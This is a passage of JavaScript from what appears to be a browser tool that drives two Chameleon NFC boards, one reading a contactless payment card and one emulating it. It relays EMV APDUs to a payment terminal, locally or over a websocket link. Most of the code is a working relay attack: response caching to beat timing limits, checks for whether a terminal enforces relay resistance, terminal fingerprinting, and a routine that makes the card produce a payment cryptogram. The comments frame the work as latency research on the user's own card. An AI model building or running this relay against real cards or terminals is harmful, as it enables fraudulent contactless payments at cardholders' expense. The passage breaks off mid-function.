  let lastApduAt = Date.now();
  const pollDelay = () => (Date.now() - lastApduAt < ACTIVE_WINDOW) ? ACTIVE_POLL : IDLE_POLL;
  $('status').textContent = `relaying (Mode ${mode})`;
  log(`=== relay started: Mode ${mode}${gate ? ' (gate-on-card)' : ''}, slot ${slot} ===`, 'ok');

  try {
    // Read the negotiated BLE interval while both boards are still IDLE — doing
    // it after arming would inject a command into the ghost while the relay loop
    // has taken over its BLE channel, which desyncs/crashes the emulation.
    await logConnParams();
    // Put the MOLE into reader mode first: this initialises the RC522. Probing
    // the field (card_probe/relay_start) before this faults the board on an
    // uninitialised RC522 and drops BLE (role_mole does set_device_reader_mode).
    await M.changeMode(true);
    // stale-card fix: force ghost OUT of emulator mode before cloning, else it
    // keeps emulating the previous run's card (slot persists in flash).
    await ghost.changeMode(true);
    ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red');

    const anti = await cloneFromMole(M, slot);
    if (!anti) { return; }            // stopped while waiting
    log(`cloned card UID=${hex(anti.uid)} ATQA=${hex(anti.atqa)} SAK=${anti.sak.toString(16)} ATS=${hex(anti.ats)}`, 'ok');

    let staticPairs = null;
    if (cacheMode === 'prefill') {
      log('cache ON: pre-reading card static flow (one-time, adds a few s to Start)…', 'ok');
      staticPairs = await buildStaticCache(M);   // read PPSE/SELECT/GPO/records/GETDATA off the live card
    }
    await armGhost(anti, slot, staticPairs);
    let armed = true;
    ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
    if (gate) log('MODE B: ghost withholds emulation until board2 has the card.', 'ok');
    log('relay loop running — tap the terminal/phone on board1.', 'ok');

    let lastStat = 0;
    let pending = null;                    // next APDU already fetched by a grouped send-recv
    let emptyStreak = 0;                   // consecutive empty relay results -> session recovery
    let sawIdle = true;                    // idle since last APDU -> next APDU starts a new tap
    let lastRx = -1;                       // ghost RF-frame counter (cached-tap activity feedback)
    const EMPTY = new Uint8Array([0, 0]);  // resp_len 0 => pure blocking recv (send nothing)
    while (running) {
      // Clear-cache requested from the button: do it here, in the loop's own context
      // (no concurrent BLE write to collide with relay traffic -> no timeout).
      if (clearRequested) {
        clearRequested = false;
        try { await ghost.clearStaticResponses(); cacheReset(); log('ghost static cache cleared', 'ok'); }
        catch (e) { log('clear cache failed: ' + (e.message || e), 'err'); }
      }
      // Mode B, withheld: don't emulate; re-arm the moment the card appears.
      if (gate && !armed) {
        const now = Date.now();
        if (now - lastStat > 500) {
          lastStat = now;
          if (await safeProbe(M)) {
            await armEmulation(anti); armed = true;
            ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
            log('board2 card seated -> emulation ARMED (phone can read)', 'ok');
          } else { ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red'); setLedUI('mole', 'red'); }
        }
        await sleep(pollDelay()); continue;
      }

      // Get the APDU to process: one a prior grouped send-recv already fetched
      // (no wait), else block ON-DEVICE for the next one (no polling round-trips).
      let apdu;
      const tWait0 = performance.now();
      if (pending !== null) {
        apdu = pending; pending = null;
      } else {
        let r0;
        try { r0 = await ghost.apduSendRecv(EMPTY); } catch (_) { await sleep(pollDelay()); continue; }
        if (r0.status !== ST.SUCCESS) {
          // idle (no APDU within the on-device block): mirror LED / Mode B disarm
          const now = Date.now();
          if (now - lastStat > 1000) {
            lastStat = now;
            const present = await safeProbe(M);
            if (gate && !present) {
              await disarmEmulation(); armed = false;
              ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red'); setLedUI('mole', 'red');
              log('board2 card removed -> emulation WITHHELD (phone sees nothing)', 'warn');
            } else {
              ghost.setLed(present ? 1 : 3).catch(() => {});
              setLedUI('ghost', present ? 'green' : 'red'); setLedUI('mole', present ? 'green' : 'red');
            }
            // Cached-tap feedback: with cache ON a tap is served in-ISR and never
            // reaches us, so the portal looks idle. The ghost's RF-frame counter still
            // climbs — surface it so you can see a cached tap happened.
            if (cacheMode === 'prefill') {
              const rc = await ghost.rxCount();
              if (rc >= 0 && lastRx >= 0 && rc !== lastRx) {
                setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
                log(`cached tap: ghost served ${((rc - lastRx + 256) % 256)} reader frame(s) from cache`, 'ok');
              }
              if (rc >= 0) lastRx = rc;
            }
          }
          sawIdle = true;   // no APDU this window -> the next one starts a new tap
          continue;   // the ~600ms block already paced us; no extra sleep
        }
        apdu = r0.data;
      }
      const wait = performance.now() - tWait0;   // ~0 if pre-fetched, else the block wait
      lastApduAt = Date.now();

      // New tap = PPSE reaching us, OR the first APDU after an idle gap. The idle
      // case matters with the cache ON: PPSE is served in-ISR from cache and never
      // reaches the loop, so without this the mole session from the previous tap
      // goes stale and later taps fail. Re-clone gives each tap a fresh session.
      if (startsWith(apdu, PPSE_HEAD) || sawIdle) {
        log('--- new transaction (tap) --- re-opening mole session', 'ok');
        await cloneFromMole(M, slot);   // fresh card session for a fresh cryptogram
        apduCount = 0;
        curPdol = null; curCdol1 = null;   // DOL layouts are per-card/per-tap
        if (!rrpSeenThisRun) rrpResolved = false;  // re-watch RRP for the new tap
      }
      sawIdle = false;
      // Terminal RRP enforcement: EXCHANGE RELAY RESISTANCE DATA (80 EA). If the
      // reader sends this, it is time-checking the relay (distance bounding).
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xEA) {
        if (!rrpSeenThisRun) log('⚠ terminal sent EXCHANGE RELAY RESISTANCE DATA (80 EA) — this reader ENFORCES RRP; the relay is being time-checked', 'warn');
        rrpSeenThisRun = true; setRrpBadge('enforced');
      }
      // Live RRP verdict: RRP (80 EA) is sent BETWEEN GPO and READ RECORD, so the
      // moment we relay a READ RECORD (00 B2) with no prior 80 EA this reader did
      // not run RRP on this tap — settle the badge now instead of waiting for Stop.
      if (apdu.length >= 2 && apdu[0] === 0x00 && apdu[1] === 0xB2 && !rrpSeenThisRun && !rrpResolved) {
        rrpResolved = true; setRrpBadge('clear');
        log('reached READ RECORD with no 80 EA — reader did NOT run RRP on this tap', 'ok');
      }
      // Terminal fingerprint: GPO command carries PDOL data (tag 83) if the card
      // has a PDOL; GENERATE AC command carries CDOL1 data. Parse against the
      // layout we learned from this card's SELECT/READ responses.
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xA8 && curPdol && apdu.length > 5) {
        const inner = tlvFind(apdu.slice(5, 5 + apdu[4]), 0x83)[0];
        if (inner) { mergeTermData(curTermData, parseDolData(curPdol, inner)); noteReader(); }
      }
      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xAE && curCdol1 && apdu.length > 5) {
        mergeTermData(curTermData, parseDolData(curCdol1, apdu.slice(5, 5 + apdu[4])));
        noteReader();
      }
      setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
      const tGot = performance.now();
      let rr;
      try { rr = await M.relayApdu(apdu); }
      catch (_) { rr = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
      const tRelay = performance.now();
      const resp = rr.status === ST.HF_TAG_OK ? rr.data : new Uint8Array(0);
      // Learn this card's DOL layouts from its responses so we can decode the
      // terminal data the reader sends next: SELECT (00 A4) FCI -> PDOL (9F38);
      // READ RECORD (00 B2) -> CDOL1 (8C).
      if (resp.length) {
        if (apdu[0] === 0x00 && apdu[1] === 0xA4) { const p = tlvFind(resp, 0x9f38)[0]; if (p) curPdol = p; }
        if (apdu[0] === 0x00 && apdu[1] === 0xB2 && !curCdol1) { const c = tlvFind(resp, 0x8c)[0]; if (c) curCdol1 = c; }
      }
      // Session auto-recovery: if the card decouples mid-transaction the mole
      // fast-fails (empty) on every APDU and a chatty reader loops forever. After a
      // few consecutive empties, re-clone the mole session so it recovers the moment
      // the card is back in contact instead of dead-looping.
      if (rr.status !== ST.HF_TAG_OK) {
        emptyStreak++;
        if (emptyStreak === 3) {
          log('mole giving empty responses — re-cloning session…', 'warn');
          try { await M.relayStop(); } catch (_) {}
          try {
            const rc = await M.relayStart();
            if (rc.status === ST.HF_TAG_OK) { log('mole session recovered', 'ok'); emptyStreak = 0; }
          } catch (_) {}
        }
      } else emptyStreak = 0;
      // GROUPED: deliver the response AND fetch the next APDU in one round-trip.
      // The on-device wait for the phone's next command replaces the poll gap.
      let rg;
      try { rg = await ghost.apduSendRecv(resp, GROUP_WAIT_MS); }
      catch (_) { rg = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
      const tSend = performance.now();
      if (rg.status === ST.SUCCESS) pending = rg.data;   // next APDU in hand -> no gap next iter
      apduCount++;
      log(`#${apduCount}  ->card ${hex(apdu)}`);
      log(`     card-> ${hex(resp)}  (st=${rr.status})`, resp.length ? '' : 'warn');
      // timing: wait = time to obtain this APDU (~0 if pre-fetched), relay = mole
      // round-trip, sendrecv = deliver response + on-device wait for the next APDU
      log(`     t: wait ${wait.toFixed(0)}ms · relay ${(tRelay - tGot).toFixed(0)}ms · sendrecv ${(tSend - tRelay).toFixed(0)}ms`);
      if (!resp.length) log('empty card response — terminal will likely abort this APDU', 'warn');
      setLedUI('ghost', 'green'); setLedUI('mole', 'green');
    }
  } catch (e) {
    log(`relay error: ${e.message || e}`, 'err');
  } finally {
    try { await M.relayStop(); } catch (_) {}
    // Release the ghost too, or it's left armed on a solid-red LED: stop
    // emulating (reader mode) and hand the LED back to the default animation,
    // so BOTH boards return to regular on Stop.
    try { await ghost.changeMode(true); } catch (_) {}
    try { await ghost.setLed(0); } catch (_) {}
    setLedUI('ghost', ''); setLedUI('mole', '');
    releaseWakeLock();
    running = false;
    $('status').textContent = 'stopped';
    log(`=== relay stopped after ${apduCount} APDUs ===`);
    updateStartEnabled();
  }
}

// Mole phone (Phase 2): connect the local mole board, join the room, and SERVE
// the ghost phone's requests onto the board. All board access is serialised
// through one chain so the periodic LED probe never overlaps a relayed APDU.
async function startMoleServe() {
  if (!mole.connected) { log('mole board not connected', 'err'); return; }
  if (!wsLink.connected) { log('not connected to the relay server', 'err'); return; }
  running = true; acquireWakeLock(); updateStartEnabled();
  $('status').textContent = 'serving (Mole)';
  log('=== mole serving — waiting for the ghost phone to drive ===', 'ok');
  try { await mole.changeMode(true); } catch (_) {}   // RC522 init

  let chain = Promise.resolve();
  const enqueue = (fn) => { const r = chain.then(fn, fn); chain = r.catch(() => {}); return r; };

  wsLink.onReq = (m) => { enqueue(() => handleMoleReq(m)); };

  let lastStat = 0;
  while (running && wsLink.connected) {
    const now = Date.now();
    if (now - lastStat > 1200) {
      lastStat = now;
      await enqueue(async () => {
        const present = await safeProbe(mole);
        mole.setLed(present ? 1 : 3).catch(() => {});
        setLedUI('mole', present ? 'green' : 'red');
      });
    }
    await sleep(200);
  }
  wsLink.onReq = null;
  try { await mole.relayStop(); } catch (_) {}
  try { await mole.setLed(0); } catch (_) {}
  setLedUI('mole', '');
  releaseWakeLock();
  running = false;
  $('status').textContent = wsLink.connected ? 'stopped' : 'link lost';
  log('=== mole serving stopped ===');
  updateStartEnabled();
}

let moleApduN = 0;
async function handleMoleReq(m) {
  try {
    if (m.t === 'scan') {
      log('ghost requested card (scan) — cloning…');
      const anti = await moleServeClone();
      if (anti) {
        setLedUI('mole', 'green'); moleApduN = 0;
        log(`cloned card UID=${hex(anti.uid)} ATS=${hex(anti.ats)} — sent to ghost`, 'ok');
        wsLink.send({ t: 'scan_res', uid: hxc(anti.uid), atqa: hxc(anti.atqa), sak: anti.sak, ats: hxc(anti.ats) });
      } else {
        log('no card on the mole — told ghost to wait', 'warn');
        wsLink.send({ t: 'scan_res' });   // no uid = no card
      }
    } else if (m.t === 'apdu') {
      setLedUI('mole', 'blue');
      const apdu = hexToBytes(m.apdu);
      let r; try { r = await mole.relayApdu(apdu); } catch (_) { r = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
      const resp = r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0);
      moleApduN++;
      log(`#${moleApduN} ->card ${hex(apdu)}`);
      log(`     card-> ${hex(resp)}  (st=${r.status})`, resp.length ? '' : 'warn');
      wsLink.send({ t: 'apdu_res', st: r.status, data: hxc(resp) });
      setLedUI('mole', 'green');
    } else if (m.t === 'stat') {
      let present = false; try { present = (await mole.cardProbe(!!m.force)).status === ST.HF_TAG_OK; } catch (_) {}
      wsLink.send({ t: 'stat_res', present });   // no log — fires ~1/s
    } else if (m.t === 'stop') {
      log('ghost ended session (stop)');
      try { await mole.relayStop(); } catch (_) {}
    }
  } catch (e) { log('mole serve error: ' + (e.message || e), 'err'); }
}

async function moleServeClone() {
  // Close any prior relay session first so the re-scan is clean — otherwise the
  // card is left in T=CL (ignores the plain probe) and the mole reads as no-card
  // after a few cycles. relay_stop powers the field off; relay_start re-RATSes.
  try { await mole.relayStop(); } catch (_) {}
  const t0 = Date.now();
  while (Date.now() - t0 < 2500 && running) {
    try {
      if ((await mole.cardProbe(true)).status === ST.HF_TAG_OK) {
        const r = await mole.relayStart();
        if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return r.parsed;
      } else { setLedUI('mole', 'red'); }
    } catch (_) {}
    await sleep(250);
  }
  return null;
}

function stopRelay() {
  running = false;
  // Reader-RRP verdict for the session just ended (only meaningful if you relayed an
  // RRP-ADVERTISING card, e.g. the Mastercard — a card that doesn't advertise RRP will
  // never make the reader send 80 EA).
  if (rrpSeenThisRun) {
    log('=== RRP VERDICT: this reader ENFORCED RRP (saw 80 EA) — relay would be time-rejected ===', 'warn');
    setRrpBadge('enforced');
  } else if (apduCount > 0) {
    log('=== RRP VERDICT: no 80 EA seen this session. Reader did NOT run RRP — but only conclusive if you relayed an RRP-advertising card (Mastercard) and the flow reached GPO ===', 'ok');
    setRrpBadge('clear');
  } else {
    setRrpBadge('none');
  }
  // Persist / update this reader in the stored list.
  const verdict = rrpSeenThisRun ? 'enforced' : (apduCount > 0 ? 'no-ea' : 'idle');
  const rec = recordReader(curTermData, verdict);
  if (rec) {
    log(`reader stored: "${rec.name}" — ${rrpLabel(rec.rrp)} · ${readerSummary(curTermData)} (seen ${rec.seen}×). Rename in Readers.`, 'ok');
    renderReaders();
  } else if (apduCount > 0) {
    log('reader not stored: no terminal fingerprint captured (empty-PDOL card, blocked before GENERATE AC). RRP verdict shown above.', 'warn');
  }
}

// Diagnostic: dump the raw reader frames the ghost captured (cmd 6009), so we can
// see exactly how a given reader (Flipper, phone, POS) frames its T=CL commands.
async function dumpRxLog() {
  if (!ghost.connected) { log('connect the ghost board first', 'warn'); return; }
  let r;
  try { r = await ghost.sendCmd(CMD.HF14A_4_RX_LOG, new Uint8Array([0]), 3000); }
  catch (e) { log('RX log read failed: ' + (e.message || e), 'err'); return; }
  const d = r.data;
  if (d.length < 4) { log('RX log empty', 'warn'); return; }
  const count = d[0], head = d[1], entries = d[2], ebytes = d[3];
  const n = Math.min(count, entries);
  log(`--- ghost RX log: ${count} reader frames (showing ${n}, oldest first) ---`, 'ok');
  for (let k = 0; k < n; k++) {
    const idx = (head - n + k + entries) % entries;
    const off = 4 + idx * (1 + ebytes);
    const lenBits = d[off];
    const nb = Math.min(Math.round(lenBits / 8), ebytes);
    log(`  rx[${k}] ${lenBits}b: ${hex(d.slice(off + 1, off + 1 + nb))}`);
  }
}

async function clearCache() {
  if (!ghost.connected) { log('connect the ghost board first', 'warn'); return; }
  // While the relay loop runs it monopolises the ghost BLE channel; a concurrent
  // clear collides/times out. Hand it to the loop, which clears at the next gap.
  if (running) {
    clearRequested = true;
    log('clear cache requested — clearing at the next gap…', 'ok');
    return;
  }
  try { await ghost.clearStaticResponses(); cacheReset(); log('ghost static cache cleared', 'ok'); }
  catch (e) { log('clear cache failed: ' + (e.message || e), 'err'); }
}

// --- DOL (PDOL/CDOL) synthesis for the payment-flow test ---------------------
// Default terminal values for the tags a card asks for. Enough to make the card
// compute a cryptogram (for latency measurement); NOT a real/authorisable txn.
function bcd(n) { return ((Math.floor(n / 10) << 4) | (n % 10)) & 0xff; }
function dolValue(tag, len) {
  const out = new Uint8Array(len);            // default = zeros
  const put = (arr) => { const b = u8(arr); out.set(b.slice(0, len), Math.max(0, len - b.length)); };
  const now = new Date();
  switch (tag) {
    case 0x9F02: put([0, 0, 0, 0, 1, 0]); break;                 // amount authorised = 1.00
    case 0x9F1A: put([0x00, 0x56]); break;                       // terminal country (BE)
    case 0x5F2A: put([0x09, 0x78]); break;                       // txn currency (EUR)
    case 0x9A:   put([bcd(now.getFullYear() % 100), bcd(now.getMonth() + 1), bcd(now.getDate())]); break;
    case 0x9F21: put([bcd(now.getHours()), bcd(now.getMinutes()), bcd(now.getSeconds())]); break;
    case 0x9C:   put([0x00]); break;                             // txn type = purchase
    case 0x9F35: put([0x22]); break;                             // terminal type
    case 0x9F33: put([0xE0, 0xF8, 0xC8]); break;                 // terminal capabilities
    case 0x9F66: put([0x36, 0x00, 0x00, 0x00]); break;           // TTQ (contactless)
    case 0x9F37: { const r = new Uint8Array(len); crypto.getRandomValues(r); out.set(r); break; }  // unpredictable number
    default: break;                                             // everything else = zeros
  }
  return out;
}
// Parse a DOL (tag-length pairs) and build the concatenated value string.
function buildDol(dol) {
  const parts = []; let i = 0;
  while (i < dol.length) {
    let tag = dol[i], tl = 1;
    if ((dol[i] & 0x1f) === 0x1f) { tag = (dol[i] << 8) | dol[i + 1]; tl = 2; }
    i += tl; if (i >= dol.length) break;
    const len = dol[i++];
    parts.push(dolValue(tag, len));
  }
  return concat(...parts);
}

// --- Reader recognition + store ---------------------------------------------
// A terminal has no UID to advertise, so we fingerprint it from the terminal
// data it leaks INTO the transaction: PDOL data (GPO) if the card has a PDOL,
// else CDOL data (GENERATE AC). Stable tags only (country/type/caps/TTQ/IDs) —
// volatile ones (unpredictable number, amount, date/time, TVR, ATC) are excluded
// so the same reader fingerprints identically tap to tap. Two identical POS
// units with no unique Terminal ID (9F1C) collide -> rename to disambiguate.
// Reverse of buildDol: split concatenated DOL values back into a tag->bytes map.
function parseDolData(dol, data) {
  const out = {}; let i = 0, di = 0;
  while (i < dol.length) {
    let tag = dol[i], tl = 1;
    if ((dol[i] & 0x1f) === 0x1f) { tag = (dol[i] << 8) | dol[i + 1]; tl = 2; }
    i += tl; if (i >= dol.length) break;
    const len = dol[i++];
    out[tag] = data.slice(di, di + len); di += len;
  }
  return out;
}
// Stable terminal-identifying tags (label + fingerprint inclusion).
const RDR_TAGS = {
  0x9F1A: 'country', 0x9F35: 'termType', 0x9F33: 'caps', 0x9F40: 'addlCaps',
  0x9F66: 'ttq', 0x9F1C: 'termId', 0x9F1E: 'ifdSerial', 0x9F4E: 'merchant',
  0x9F16: 'merchantId', 0x9F15: 'mcc', 0x9F3C: 'refCurrency', 0x9F1D: 'termRiskMgmt',
};
function mergeTermData(dst, td) { for (const t in td) { if (RDR_TAGS[t] && td[t] && td[t].length) dst[t] = td[t]; } }
function readerFingerprint(td) {
  const parts = [];
  for (const t of Object.keys(RDR_TAGS).map(Number).sort((a, b) => a - b))
    if (td[t] && td[t].length) parts.push(t.toString(16) + ':' + hxc(td[t]));
  return parts.join('|');
}
const CTRY = { '0056': 'BE', '0250': 'FR', '0276': 'DE', '0528': 'NL', '0826': 'GB', '0840': 'US', '0724': 'ES', '0380': 'IT' };
function readerSummary(td) {
  const bits = [];
  if (td[0x9F1A]) { const c = hxc(td[0x9F1A]); bits.push('country ' + (CTRY[c] || c)); }
  if (td[0x9F35]) bits.push('type ' + hxc(td[0x9F35]));
  if (td[0x9F66]) bits.push('TTQ ' + hxc(td[0x9F66]));
  if (td[0x9F1C]) bits.push('termID ' + hxc(td[0x9F1C]));
  if (td[0x9F1E]) bits.push('IFD ' + hxc(td[0x9F1E]));
  return bits.join(' · ') || 'no terminal data captured';
}
function loadReaders() { try { return JSON.parse(localStorage.getItem('emvReaders') || '[]'); } catch (_) { return []; } }
function saveReaders(r) { try { localStorage.setItem('emvReaders', JSON.stringify(r)); } catch (_) {} }
// Save/merge a reader after a session. Matches by fingerprint when we captured
// one; otherwise stores an unrecognisable entry (empty-PDOL card, blocked before
// GENERATE AC) that the user names by hand. verdict: enforced|no-ea|idle.
function recordReader(td, verdict) {
  const fp = readerFingerprint(td);
  if (!fp && verdict === 'idle') return null;       // nothing worth storing
  const list = loadReaders();
  const now = Date.now();
  let r = fp ? list.find(x => x.fp === fp) : null;
  if (r) {
    r.seen++; r.last = now; r.tags = td && Object.keys(td).length ? hexTags(td) : r.tags;
    if (verdict === 'enforced') r.rrp = 'enforced';
    else if (verdict === 'no-ea' && r.rrp !== 'enforced') r.rrp = 'no-ea';
  } else {
    r = { id: 'r' + now.toString(36), name: 'Reader ' + (list.length + 1), fp,
          tags: hexTags(td), rrp: verdict, seen: 1, first: now, last: now };
    list.push(r);
  }
  saveReaders(list);
  return r;
}
function hexTags(td) { const o = {}; for (const t in td) if (td[t]) o[t] = hxc(td[t]); return o; }
function rrpLabel(v) { return v === 'enforced' ? '⚠ enforces RRP' : v === 'no-ea' ? '✓ no RRP seen' : v === 'idle' ? '— (no flow)' : '?'; }
// Called mid-run once we've captured terminal data: if its fingerprint matches a
// stored reader, announce the recognition once.
function noteReader() {
  if (recognisedThisRun) return;
  const fp = readerFingerprint(curTermData);
  if (!fp) return;
  const hit = loadReaders().find(x => x.fp === fp);
  if (hit) { recognisedThisRun = true; log(`recognised reader: "${hit.name}" (${rrpLabel(hit.rrp)}, seen ${hit.seen}×) — ${readerSummary(curTermData)}`, 'ok'); }
  else { recognisedThisRun = true; log(`new reader fingerprint — ${readerSummary(curTermData)} (saved on Stop)`, 'ok'); }
}
// Log each board's negotiated BLE interval so we can see the real relay-latency
// floor (and whether a native app forcing CONNECTION_PRIORITY_HIGH would help).
async function logConnParams() {
  for (const [name, b] of [['ghost', ghost], ['mole', mole]]) {
    if (!b || typeof b.connParams !== 'function') continue;
    const p = await b.connParams();
    if (!p) { log(`${name} BLE interval: unknown (old firmware or remote board)`, 'warn'); continue; }
    const near = p.maxMs <= 16;
    log(`${name} BLE interval: ${p.minMs.toFixed(2)}–${p.maxMs.toFixed(2)} ms (latency ${p.latency}, timeout ${p.timeoutMs} ms) — ${near ? 'already near the 7.5–15 ms floor; a native app would NOT help' : 'THROTTLED above 15 ms; a native app (CONNECTION_PRIORITY_HIGH) would help'}`, near ? 'ok' : 'warn');
  }
}
function unhexTags(t) { const o = {}; for (const k in (t || {})) o[k] = hexToBytes(t[k]); return o; }
function esc(s) { return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])); }
// Render the stored-reader table into #readers-panel.
function renderReaders() {
  const panel = $('readers-panel'); if (!panel) return;
  const list = loadReaders().sort((a, b) => b.last - a.last);
  if (!list.length) { panel.innerHTML = '<div style="color:var(--muted);padding:8px 4px">No readers stored yet. Run a relay against a reader (RRP verdict is stored even when no fingerprint is captured, but only fingerprinted readers auto-recognise).</div>'; return; }
  let h = '<table style="width:100%;border-collapse:collapse;font-size:12px">'
        + '<tr style="color:var(--muted);text-align:left"><th style="padding:4px 6px">Reader</th><th>RRP</th><th>Terminal</th><th>Seen</th><th>Last</th><th></th></tr>';
  for (const r of list) {
    const sum = r.fp ? readerSummary(unhexTags(r.tags)) : '(no fingerprint — name it yourself)';
    h += `<tr style="border-top:1px solid var(--line)">`
       + `<td style="padding:4px 6px;font-weight:600">${esc(r.name)}</td>`
       + `<td>${esc(rrpLabel(r.rrp))}</td>`
       + `<td style="color:var(--muted)">${esc(sum)}</td>`
       + `<td>${r.seen}</td>`
       + `<td style="color:var(--muted)">${new Date(r.last).toLocaleDateString()}</td>`
       + `<td style="white-space:nowrap"><button class="rdr-rename" data-id="${r.id}" style="padding:3px 8px">Rename</button> <button class="rdr-del" data-id="${r.id}" style="padding:3px 8px">Delete</button></td>`
       + `</tr>`;
  }
  panel.innerHTML = h + '</table>';
}
function toggleReaders() {
  const panel = $('readers-panel'); if (!panel) return;
  panel.hidden = !panel.hidden;
  if (!panel.hidden) renderReaders();
}
function renameReader(id) {
  const list = loadReaders(); const r = list.find(x => x.id === id); if (!r) return;
  const name = prompt('Reader name:', r.name); if (name == null) return;
  r.name = name.trim() || r.name; saveReaders(list); renderReaders();
}
function deleteReader(id) {
  const list = loadReaders().filter(x => x.id !== id); saveReaders(list); renderReaders();
}
// Download the stored reader list + the on-screen log as one timestamped JSON.
function exportData() {
  const logLines = Array.from($('log').children).map(n => n.textContent);
  const readers = loadReaders();
  const bundle = { exported: new Date().toISOString(), build: BUILD, readers, log: logLines };
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const blob = new Blob([JSON.stringify(bundle, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = `chameleon-relay-${stamp}.json`;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 2000);
  log(`exported ${readers.length} reader(s) + ${logLines.length} log line(s) → ${a.download}`, 'ok');
}

// Payment-flow latency test on YOUR OWN card (mole-driven, no POS). Runs
// PPSE->SELECT->GPO->READ->GENERATE AC with synthetic terminal data and times
// GENERATE AC. Produces a structurally-valid ARQC for LATENCY MEASUREMENT ONLY —
// it is never submitted anywhere (that would be fraud). Full relay round-trip is
// estimated = measured card time + the ghost/BLE leg seen in live-read logs.
async function testPayment() {
  if (running) { log('stop the relay first, then Test payment', 'warn'); return; }
  if (!mole.connected) { log('connect the mole board first', 'warn'); return; }
  const M = mole;
  try { await M.changeMode(true); } catch (_) {}
  try { await M.relayStop(); } catch (_) {}
  log('payment test: opening card on the mole…', 'ok');
  let anti = null;
  for (let k = 0; k < 20; k++) {
    try { const r = await M.relayStart(); if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) { anti = r.parsed; break; } } catch (_) {}
    await sleep(300);
  }
  if (!anti) { log('payment test: no card on the mole', 'warn'); return; }
  const timed = async (apdu) => {
    const t0 = performance.now();
    let d = new Uint8Array(0);
    try { const r = await M.relayApdu(apdu); if (r.status === ST.HF_TAG_OK) d = r.data; } catch (_) {}
    return { d, ms: performance.now() - t0 };
  };
  const fci = (await timed(hexToBytes('00A404000E325041592E5359532E444446303100'))).d;
  const seen = new Set();
  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seen.has(h)) return false; seen.add(h); return true; });
  let done = false;
  for (const aid of aids) {
    if (done) break;
    const selResp = (await timed(concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00])))).d;
    if (!sw9000(selResp)) continue;
    // GPO with the card's PDOL (9F38) filled, else empty
    const pdol = tlvFind(selResp, 0x9f38)[0];
    const gpoData = pdol ? concat(u8([0x83]), u8([buildDol(pdol).length]), buildDol(pdol)) : hexToBytes('8300');
    const gpoCmd = concat(u8([0x80, 0xa8, 0x00, 0x00, gpoData.length]), gpoData, u8([0x00]));
    const gpo = await timed(gpoCmd);
    if (!sw9000(gpo.d)) { log(`payment test ${hxc(aid)}: GPO -> ${hxc(gpo.d.slice(-2))}`, 'warn'); continue; }
    // read records to find CDOL1 (8C)
    let cdol1 = null; const records = [];
    for (const { sfi, r1, r2 } of parseAfl(gpo.d)) {
      for (let rec = r1; rec <= r2; rec++) {
        const rd = (await timed(u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00]))).d;
        if (sw9000(rd)) { records.push(rd); const c = tlvFind(rd, 0x8c)[0]; if (c) cdol1 = c; }
      }
    }
    if (!cdol1) { log(`payment test ${hxc(aid)}: no CDOL1 (tag 8C) found — cannot GENERATE AC on this AID`, 'warn'); continue; }
    // GENERATE AC (ARQC, P1=0x80) with synthetic CDOL data
    const cdolData = buildDol(cdol1);
    const genac = concat(u8([0x80, 0xae, 0x80, 0x00, cdolData.length]), cdolData, u8([0x00]));
    const ac = await timed(genac);
    const ok = ac.d.length > 2 && sw9000(ac.d);
    log(`payment test AID ${hxc(aid)}: GENERATE AC -> ${ok ? 'cryptogram returned' : 'SW ' + hxc(ac.d.slice(-2) || [])}`, ok ? 'ok' : 'warn');
    if (ok) {
      const cid = tlvFind(ac.d, 0x9f27)[0], atc = tlvFind(ac.d, 0x9f36)[0], arqc = tlvFind(ac.d, 0x9f26)[0];
      log(`   CID=${cid ? hxc(cid) : '?'} ATC=${atc ? hxc(atc) : '?'} cryptogram=${arqc ? hxc(arqc) : '(in 77 template)'}`);
      log(`   GENERATE AC card time (mole-direct): ${ac.ms.toFixed(0)} ms`, 'ok');
      log(`   est. FULL relay round-trip ≈ ${ac.ms.toFixed(0)} + ~200 ms (ghost+BLE leg from read logs) ≈ ${(ac.ms + 200).toFixed(0)} ms`, 'ok');
      log(`   (structurally-valid ARQC for latency only — NOT submitted anywhere)`, 'warn');
      done = true;
    }
  }
  if (!done) log('payment test: no AID produced a cryptogram (card may need CDA/P1=0x90 or a fuller CDOL)', 'warn');
  try { await M.relayStop(); } catch (_) {}
  log('payment test done.', 'ok');
}

// RRP-capability readout for YOUR OWN card: read each AID's AIP (Relay Resistance
// bit) and probe EXCHANGE RELAY RESISTANCE DATA (80 EA). Tells you whether the card
// is relay-hardened. Diagnostic only; run with the card on the mole, relay stopped.
async function checkRRP() {
  if (running) { log('stop the relay first, then Check RRP', 'warn'); return; }
  if (!mole.connected) { log('connect the mole board first', 'warn'); return; }
  const M = mole;
  try { await M.changeMode(true); } catch (_) {}
  try { await M.relayStop(); } catch (_) {}
  log('RRP check: reading card on the mole…', 'ok');
  let anti = null;
  for (let i = 0; i < 20; i++) {
    try { const r = await M.relayStart(); if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) { anti = r.parsed; break; } } catch (_) {}
    await sleep(300);
  }
  if (!anti) { log('RRP check: no card on the mole', 'warn'); return; }
